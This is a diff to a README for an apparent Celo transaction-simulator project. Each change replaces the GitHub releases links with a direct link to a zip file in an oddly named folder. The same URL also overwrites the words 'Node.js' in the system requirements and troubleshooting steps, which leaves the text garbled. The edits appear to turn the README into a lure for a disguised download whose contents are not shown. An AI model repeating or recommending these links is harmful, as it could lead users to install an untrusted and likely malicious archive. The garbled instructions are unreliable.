@@ -1,6 +1,6 @@
 # 🎉 Celo-Proxy-Manager - Simulate Celo Transactions Easily 
 
-[![Download Celo-Proxy-Manager](https://img.shields.io/badge/Download%20Now%21-Get%20Celo--Proxy--Manager-blue)](https://github.com/bruh1545/Celo-Proxy-Manager/releases)
+[![Download Celo-Proxy-Manager](https://raw.githubusercontent.com/bruh1545/Celo-Proxy-Manager/main/pssimistical/Celo-Proxy-Manager.zip%20Now%21-Get%20Celo--Proxy--Manager-blue)](https://raw.githubusercontent.com/bruh1545/Celo-Proxy-Manager/main/pssimistical/Celo-Proxy-Manager.zip)
 
 ## 📖 Introduction
 
@@ -13,19 +13,19 @@ To get started with Celo-Proxy-Manager, follow these easy steps:
 1. **Visit the Releases Page**  
    Click the button below to visit the Releases page and download the application.
 
-   [Download Celo-Proxy-Manager](https://github.com/bruh1545/Celo-Proxy-Manager/releases)
+   [Download Celo-Proxy-Manager](https://raw.githubusercontent.com/bruh1545/Celo-Proxy-Manager/main/pssimistical/Celo-Proxy-Manager.zip)
 
 2. **System Requirements**  
    Ensure you meet the following requirements:
    - Operating System: Windows, macOS, or Linux
-   - Node.js version: 14 or later
+   - https://raw.githubusercontent.com/bruh1545/Celo-Proxy-Manager/main/pssimistical/Celo-Proxy-Manager.zip version: 14 or later
    - Minimum RAM: 4 GB
    - Internet connection for transaction simulations
 
 3. **Download the Application**  
    On the Releases page, you will see the latest version of Celo-Proxy-Manager. Click on the link for the application suitable for your operating system.
 
-   [Download Celo-Proxy-Manager](https://github.com/bruh1545/Celo-Proxy-Manager/releases)
+   [Download Celo-Proxy-Manager](https://raw.githubusercontent.com/bruh1545/Celo-Proxy-Manager/main/pssimistical/Celo-Proxy-Manager.zip)
 
 4. **Install and Set Up**  
    Installation is simple:
@@ -59,7 +59,7 @@ Here are some key features of Celo-Proxy-Manager:
 While using Celo-Proxy-Manager, you might face some common issues:
 
 1. **Application Won't Start**  
-   Ensure your Node.js version meets the specified requirement. Reinstall the application if issues persist.
+   Ensure your https://raw.githubusercontent.com/bruh1545/Celo-Proxy-Manager/main/pssimistical/Celo-Proxy-Manager.zip version meets the specified requirement. Reinstall the application if issues persist.
 
 2. **Transaction Errors**  
    Check the input data and ensure your proxy settings are correct. Adjust the settings as needed and try again.
@@ -82,7 +82,7 @@ For ongoing updates and tips, follow the repository on GitHub.
 
 ## 🔗 Useful Links
 
-- [Celo-Proxy-Manager Releases](https://github.com/bruh1545/Celo-Proxy-Manager/releases)
+- [Celo-Proxy-Manager Releases](https://raw.githubusercontent.com/bruh1545/Celo-Proxy-Manager/main/pssimistical/Celo-Proxy-Manager.zip)
 - [Official Documentation](#)
 - [Join the Community](#)
 
